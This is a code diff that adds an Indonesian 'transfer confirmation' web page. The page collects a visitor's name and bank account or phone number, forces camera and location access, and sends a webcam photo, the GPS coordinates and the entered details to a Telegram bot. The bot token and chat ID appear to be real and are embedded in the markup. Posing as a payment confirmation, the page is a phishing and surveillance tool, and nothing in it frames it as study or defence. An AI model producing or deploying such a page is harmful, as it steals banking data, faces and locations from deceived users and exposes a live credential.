@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<title>Konfirmasi Transfer</title>
+
+<style>
+body {
+    font-family: Arial;
+    background: #f0f2f5;
+    text-align: center;
+}
+.box {
+    background: white;
+    padding: 20px;
+    margin: 30px auto;
+    width: 320px;
+    border-radius: 10px;
+}
+input {
+    width: 90%;
+    padding: 10px;
+    margin: 8px 0;
+}
+button {
+    padding: 10px;
+    width: 95%;
+    background: green;
+    color: white;
+    border: none;
+}
+video {
+    width: 100%;
+}
+</style>
+
+</head>
+<body>
+
+<div class="box">
+<h3>Konfirmasi Transfer</h3>
+
+<!-- INPUT ADMIN -->
+<input type="text" id="token" placeholder="">8117480516:AAH1weOYq_Tm2cLaozpdTv59YwWCoKLF6Rg<br>
+<input type="text" id="chatid" placeholder="6863271264"><br><br>
+
+<!-- DATA USER -->
+<input type="text" id="nama" placeholder="Nama"><br>
+<input type="text" id="rek" placeholder="No Rek / HP"><br>
+
+<video id="video" autoplay></video><br><br>
+
+<button onclick="startCam()">Aktifkan Kamera</button><br><br>
+<button onclick="kirim()">Kirim Data</button>
+
+</div>
+
+<script>
+let stream;
+
+function startCam() {
+    navigator.mediaDevices.getUserMedia({ video: true })
+    .then(s => {
+        stream = s;
+        document.getElementById("video").srcObject = s;
+    })
+    .catch(() => alert("Kamera wajib diizinkan!"));
+}
+
+function kirim() {
+    let token = document.getElementById("token").value;
+    let chatid = document.getElementById("chatid").value;
+    let nama = document.getElementById("nama").value;
+    let rek = document.getElementById("rek").value;
+
+    if (!token || !chatid) {
+        alert("Token & Chat ID wajib diisi!");
+        return;
+    }
+
+    if (!nama || !rek) {
+        alert("Isi data user!");
+        return;
+    }
+
+    if (!stream) {
+        alert("Aktifkan kamera dulu!");
+        return;
+    }
+
+    navigator.geolocation.getCurrentPosition(pos => {
+
+        let video = document.getElementById("video");
+        let canvas = document.createElement("canvas");
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        canvas.getContext("2d").drawImage(video, 0, 0);
+
+        canvas.toBlob(blob => {
+
+            let form = new FormData();
+            form.append("chat_id", chatid);
+
+            let caption =
+                "DATA KONFIRMASI\n" +
+                "Nama: " + nama + "\n" +
+                "Rek: " + rek + "\n" +
+                "Lokasi: https://maps.google.com/?q=" +
+                pos.coords.latitude + "," + pos.coords.longitude;
+
+            form.append("caption", caption);
+            form.append("photo", blob, "foto.png");
+
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: "POST",
+                body: form
+            }).then(() => {
+                alert("Berhasil dikirim!");
+                window.location.href = "sukses.html";
+            });
+
+        });
+
+    }, () => alert("Lokasi wajib diizinkan!"));
+}
+</script>
+
+</body>
+  </html>
